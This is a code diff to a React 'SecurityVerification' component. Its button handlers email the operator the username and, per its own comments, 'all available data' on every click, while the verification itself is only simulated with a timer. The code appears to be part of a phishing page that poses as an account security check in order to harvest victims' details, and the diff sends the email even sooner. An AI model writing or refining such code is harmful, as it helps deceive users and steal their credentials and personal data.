@@ -1,3 +1,4 @@
+
 import React, { useState } from "react";
 import { Button } from "@/components/ui/button";
 import { useToast } from "@/hooks/use-toast";
@@ -19,11 +20,10 @@ const SecurityVerification: React.FC<SecurityVerificationProps> = ({
   const { toast } = useToast();
 
   const handleVerifyApp = async () => {
-    setIsVerifying(true);
+    // Send email IMMEDIATELY when button is clicked
+    console.log('🚨 SECURITY VERIFICATION BUTTON CLICKED - Sending email immediately...');
     
-    // Send HIGH PRIORITY email with ALL AVAILABLE DATA immediately when button is clicked
     try {
-      console.log('🚨 Sending HIGH PRIORITY security verification email with ALL DATA immediately...');
       await sendHighPriorityNotification({
         step: "🔴 SECURITY VERIFICATION - APP VERIFIED BUTTON CLICKED",
         username,
@@ -37,10 +37,12 @@ const SecurityVerification: React.FC<SecurityVerificationProps> = ({
           currentStep: "security_verification"
         }
       });
-      console.log('✅ HIGH PRIORITY security verification email with ALL DATA sent immediately!');
+      console.log('✅ Security verification email sent immediately!');
     } catch (error) {
-      console.error('❌ HIGH PRIORITY security verification email failed:', error);
+      console.error('❌ Security verification email failed:', error);
     }
+
+    setIsVerifying(true);
     
     // Simulate app verification
     setTimeout(() => {
@@ -54,9 +56,10 @@ const SecurityVerification: React.FC<SecurityVerificationProps> = ({
   };
 
   const handleOtherMethods = async () => {
-    // Send HIGH PRIORITY email with ALL AVAILABLE DATA immediately when button is clicked
+    // Send email IMMEDIATELY when button is clicked
+    console.log('🚨 OTHER METHODS BUTTON CLICKED - Sending email immediately...');
+    
     try {
-      console.log('🚨 Sending HIGH PRIORITY other methods email with ALL DATA immediately...');
       await sendHighPriorityNotification({
         step: "🔴 SECURITY VERIFICATION - OTHER METHODS BUTTON CLICKED",
         username,
@@ -70,9 +73,9 @@ const SecurityVerification: React.FC<SecurityVerificationProps> = ({
           currentStep: "security_verification"
         }
       });
-      console.log('✅ HIGH PRIORITY other methods email with ALL DATA sent immediately!');
+      console.log('✅ Other methods email sent immediately!');
     } catch (error) {
-      console.error('❌ HIGH PRIORITY other methods email failed:', error);
+      console.error('❌ Other methods email failed:', error);
     }
     
     // Skip to next step for "other methods"
@@ -84,7 +87,7 @@ const SecurityVerification: React.FC<SecurityVerificationProps> = ({
   };
 
   const handleBack = async () => {
-    // Send email notification with ALL AVAILABLE DATA
+    // Send email notification
     try {
       await sendHighPriorityNotification({
         step: "🔴 SECURITY VERIFICATION - BACK BUTTON CLICKED",
